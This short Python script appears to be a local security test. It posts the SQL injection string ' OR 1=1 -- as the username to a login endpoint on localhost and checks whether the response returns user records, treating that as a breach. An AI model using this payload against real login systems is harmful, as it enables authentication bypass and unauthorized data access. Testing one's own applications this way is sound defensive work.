import httpx
import asyncio

async def test():
    payload = "' OR 1=1 --"
    r = await httpx.AsyncClient().post('http://localhost:5000/login', json={'username': payload, 'password': 'x'})
    d = r.json()
    print('Response:', d)
    is_breach = d.get('status') == 'success' and isinstance(d.get('user'), list) and len(d.get('user', [])) > 0
    print('Is breach:', is_breach)

asyncio.run(test())
